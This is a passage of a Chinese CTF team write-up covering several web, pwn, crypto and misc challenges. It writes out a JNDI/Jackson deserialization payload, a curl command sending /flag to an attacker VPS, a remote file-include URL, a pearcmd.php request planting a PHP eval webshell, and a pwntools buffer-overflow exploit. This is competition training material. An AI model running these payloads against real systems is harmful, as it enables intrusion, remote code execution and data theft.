+<p><img src="/img/2021nitai/image-20211025235652753.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235652753.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235652753"></p>
+<p>报错，提示这个 <code>com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource</code> 类找不到</p>
+<p>尝试依次删除类前缀，下面这个就可以</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>,&#123;<span class="attr">&quot;jndiLocation&quot;</span>:<span class="string">&quot;ldap://vps:2233/a&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211025235820066.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235820066.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235820066"></p>
+<p>可以成功返回数据，那应该是这种利用方式了，但为啥要删除类前缀就不是很清楚，估计题目中把这个包名给换了。</p>
+<blockquote>
+<p>队里大佬说各种找payload，随便找一个就能用了，不像我复现红明谷的时候还有个小坑</p>
+</blockquote>
+<p>然后上 JNDI 利用工具 （</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<p>关于原理，除了可以参考刚刚安全客的文章，还可以看这篇</p>
+<p><a target="_blank" rel="noopener" href="http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/">http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/</a></p>
+<p>即利⽤LDAP Server返回序列化数据触发反序列化。</p>
+<p>这里因服务端 jdk 版本过⾼，⽆法加载远程class，所以用 LDAP </p>
+<p>在公网服务器上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211026000646717.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026000646717.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026000646717"></p>
+<p>注意，题目描述是有个压缩包，里面放着 <code>pom.xml</code> 的，里面有些是用Spring开发和版本之类的，然后红明谷就没有，只有未授权访问成功在网页的icon上有一片绿色的叶子，提示这是 Spring… 像下图这样</p>
+<p><img src="/img/2021nitai/image-20211025234020628.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025234020628.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025234020628"></p>
+<p>所以我们运行 JNDI，一定要选JDK（写着 SpringBoot 1.2.x+）的，就可以了</p>
+<p>然后发现不知为啥Shell反弹不回来，不过没事，既然我们服务端能接收请求，那服务肯定是出网的，尝试通过 <code>curl</code> 外带</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&#x27;curl http://vps_ip:2233 -F file=@/flag&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211026001138058.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026001138058.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026001138058"></p>
+<p>从结果而言就题目考点就 Shiro + Jackson 反序列化，但一条龙下来，还是容易踩坑的，2333</p>
+<h3 id="0x5-new-hospital"><a href="#0x5-new-hospital" class="headerlink" title="0x5 new_hospital"></a>0x5 new_hospital</h3><p><a href="https://tari.moe/">@tari</a></p>
+<p>对于完全黑盒的题目，第一步肯定是信息收集，先目录爆破，爆破出来的很多，但实际有用的就3个（从做出来的结果而言，一开始分析的还挺头疼的）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://123.60.75.243:32766/old/       </span><br><span class="line">http://123.60.75.243:32766/flag.php     </span><br><span class="line">http://123.60.75.243:32766/feature.php</span><br></pre></td></tr></table></figure>
+
+<p>访问 /flag.php 返回 <code>hacker?</code><br>在 feature.php 发现个文件读取，不过被拼接 .js 文件后缀</p>
+<p><img src="/img/2021nitai/image-20211026001449562.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026001449562.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026001449562"></p>
+<p>尝试远程读取进来，可以通过URL特性截断 .js ，但写入为JS代码了，无法解析为PHP代码<br><a target="_blank" rel="noopener" href="http://123.60.75.243:32766/feature.php?&amp;id=http://VPS_IP/in.php?%2500">http://123.60.75.243:32766/feature.php?&amp;id=http://VPS_IP/in.php%3F%2500</a></p>
+<p><img src="/img/2021nitai/IMG_0381.JPG" class="lazyload" data-srcset="/img/2021nitai/IMG_0381.JPG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="IMG_0381"></p>
+<p><img src="/img/2021nitai/IMG_0382.JPG" class="lazyload" data-srcset="/img/2021nitai/IMG_0382.JPG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="IMG_0382"></p>
+<p>仔细看，发现通过这个文件读取接口会返回一个Cookie</p>
+<p><img src="/img/2021nitai/image-20211026001921694.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026001921694.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026001921694"></p>
+<p>解码发现是刚刚提交的目录，注意文件后缀已经拼接了 .js（待会用到）</p>
+<p><img src="/img/2021nitai/image-20211026001947710.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026001947710.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026001947710"></p>
+<p>后面翻目录爆破出来的，访问 /old/feature.php</p>
+<p><img src="/img/2021nitai/image-20211026002030304.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002030304.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002030304"></p>
+<p>发现竟然和我刚刚访问在 /feature.php 提交的一样，开始寻思这是缓存？</p>
+<p>是不是 file_get_content + file_put_content 呢？尝试 php filter 过滤器差异化写入无果，突然想到刚刚的Cookie，难道/old是通过Cookie里的目录设置的文件包含的内容？这样刚好可以直接无视 .js 后缀，然后结合目录爆破出来的 flag.php 是不是就能读到什么…</p>
+<p>验证一下</p>
+<p><img src="/img/2021nitai/image-20211026002138140.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002138140.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002138140"></p>
+<h3 id="0x6-Give-me-your-0day"><a href="#0x6-Give-me-your-0day" class="headerlink" title="0x6 Give_me_your_0day"></a>0x6 Give_me_your_0day</h3><p><a href="#">@Oah</a></p>
+<p>install.php 608 行有个文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/install.php?config&amp;dbAdapter=[路径]</span><br></pre></td></tr></table></figure>
+
+<p>查到可以用 /usr/local/lib/php/pearcmd.php 利用</p>
+<p>很多目录都没有写权限，但是发现/tmp目录可以写</p>
+<p>写木马</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/install.php?config&amp;+-c+/tmp/a.php+-d+man_dir=&lt;?eval($_GET[&quot;cmd&quot;]);?&gt;/*+-s+list&amp;dbAdapter=../../../../usr/local/lib/php/pearcmd&amp;&amp;XDEBUG_SESSION_START=PHPSTORM</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>121.36.229.59:32767</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://121.36.229.59:32767/install.php?config</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__typecho_lang=zh_CN</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211026002600523.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002600523.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002600523"></p>
+<p>读flag</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/install.php?config&amp;dbAdapter=../../../../tmp/a&amp;cmd=system(&#x27;cat+/flag&#x27;);</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>121.36.229.59:32767</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://121.36.229.59:32767/install.php?config</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__typecho_lang=zh_CN</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211026002529336.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002529336.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002529336"></p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x1-sonic"><a href="#0x1-sonic" class="headerlink" title="0x1 sonic"></a>0x1 sonic</h3><p> <a href="#">@小火车</a></p>
+<p>ida查看gets函数存在栈溢出，将输入的登录名溢出到RSP<br>通过ida查看不用登录的地址偏移在0x73a</p>
+<p><img src="/img/2021nitai/image-20211026002644504.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002644504.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002644504"></p>
+<p>通过python直接获取远程服务器main地址为0x00005555555547cf</p>
+<p><img src="/img/2021nitai/image-20211026002700136.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002700136.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002700136"></p>
+<p>用patternLocOffset.py计算得到偏移量为40</p>
+<p><img src="/img/2021nitai/image-20211026002718009.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002718009.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002718009"></p>
+<p><img src="/img/2021nitai/image-20211026002728052.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002728052.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002728052"></p>
+<p><img src="/img/2021nitai/image-20211026002742536.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002742536.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002742536"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;123.60.63.90&#x27;</span>,<span class="number">6888</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x000055555555473a</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;login:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x1-拟态签到题"><a href="#0x1-拟态签到题" class="headerlink" title="0x1 拟态签到题"></a>0x1 拟态签到题</h3><p>解压压缩包，flag.txt base64解码得到<br>flag{GaqY7KtEtrVIX1Q5oP5iEBRCYXEAy8rT}</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>每个题都只做了前面一点，后面不太会，<a target="_blank" rel="noopener" href="https://www.yuque.com/vbpnt">@LI</a> 大佬NB~</p>
+<h3 id="0x1-WeirdPhoto"><a href="#0x1-WeirdPhoto" class="headerlink" title="0x1 WeirdPhoto"></a>0x1 WeirdPhoto</h3><p><a target="_blank" rel="noopener" href="https://www.yuque.com/vbpnt">@LI</a> <a href="https://tari.moe/">@tari</a></p>
+<p>一开始1.png 不知道是啥…，突然发现win下是可以打开看的，经典的高度或者宽度被修改了，通过png crc计算出图片原来的宽高</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开图片</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;/Users/tari/Downloads/1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="comment"># 假设原图片大小在 2000x2000以内</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">               struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment"># 图片当前CRC, 即 0x9e916964 为 CRC, 对应16进制编辑器里 00000010h d-f 和 00000020h 0</span></span><br><span class="line">        <span class="keyword">if</span> (crc32 == <span class="number">0x9e916964</span>):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/2021nitai/image-20211026002900343.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002900343.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002900343"></p>
+<p>输入右边的英文 TIEWOFTHSAEOUIITNRBCOSHSTSAN 密码不对</p>
+<p>解出压缩包密码：THISISTHEANSWERTOOBSFUCATION</p>
+<p><img src="/img/2021nitai/image-20211026002915843.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002915843.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002915843"></p>
+<p>里面一堆图片，但直接把 <code>out </code> 丢进16进制编辑器可以看到一堆 obj，所以猜    是个PDF，修复一下文件头</p>
+<p><img src="/img/2021nitai/image-20211026003007224.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003007224.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003007224"></p>
+<p>搜一下 PDF 隐写，发现很多都是用的 wbStego4，下个wbStego4，默认选项解密，然后保存输出为txt，就能得到flag</p>
+<p><img src="/img/2021nitai/image-20211026003050096.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003050096.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003050096"></p>
+<h3 id="0x2-bar"><a href="#0x2-bar" class="headerlink" title="0x2 bar"></a>0x2 bar</h3><p><a target="_blank" rel="noopener" href="https://www.yuque.com/vbpnt">@LI</a>  <a href="">@小火车</a> <a href="https://tari.moe/">@tari</a></p>
+<p>官方提示：</p>
+<ol>
+<li><p>观察得到字符串在code93在线网站生成的条形码停止字符的前两位字符 </p>
+</li>
+<li><p>flag内容都是小写英文字母</p>
+</li>
+</ol>
+<p>根据题目名称，得知是一个条形码，然后把 GIF每一帧拼接一下即可，网上找个脚本魔改了一下</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cony_14/article/details/102730294">https://blog.csdn.net/Cony_14/article/details/102730294</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工作目录, 会在该目录生成大量临时文件, 尽量新建文件夹运行哈</span></span><br><span class="line">FILE_ROOT = <span class="string">&#x27;/Users/tari/Downloads/gif&#x27;</span></span><br><span class="line"><span class="comment"># 待处理图片</span></span><br><span class="line">GIT_PATH = os.path.join(FILE_ROOT, <span class="string">&#x27;output.gif&#x27;</span>)</span><br><span class="line"><span class="comment"># GIF每张图片宽度</span></span><br><span class="line">IMAGE_WIDTH = <span class="number">20</span></span><br><span class="line"><span class="comment"># GIF每张图片高度</span></span><br><span class="line">IMAGE_HEIGHT = <span class="number">100</span></span><br><span class="line"><span class="comment"># 最终输出图片高度, 如果过长可以稍微调节下, 一般 100 足够了</span></span><br><span class="line">TARGET_HEIGHT = <span class="number">100</span></span><br><span class="line"><span class="comment"># 输出图片名称</span></span><br><span class="line">OUTPUT_IMAGE = <span class="string">&#x27;new_im.png&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(GIT_PATH)</span><br><span class="line"><span class="comment"># 打开一个序列文件时，PIL库自动加载第一帧, 保存第一帧到当前目录下</span></span><br><span class="line">im.save(os.path.join(FILE_ROOT, <span class="built_in">str</span>(im.tell()) + <span class="string">&#x27;.png&#x27;</span>))</span><br><span class="line"><span class="comment"># 计数有多少帧</span></span><br><span class="line">image_cnt = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 向下一帧移动</span></span><br><span class="line">        im.seek(im.tell() + <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 保存下一帧</span></span><br><span class="line">        im.save(os.path.join(FILE_ROOT, <span class="built_in">str</span>(im.tell()) + <span class="string">&#x27;.png&#x27;</span>))</span><br><span class="line">        image_cnt += <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 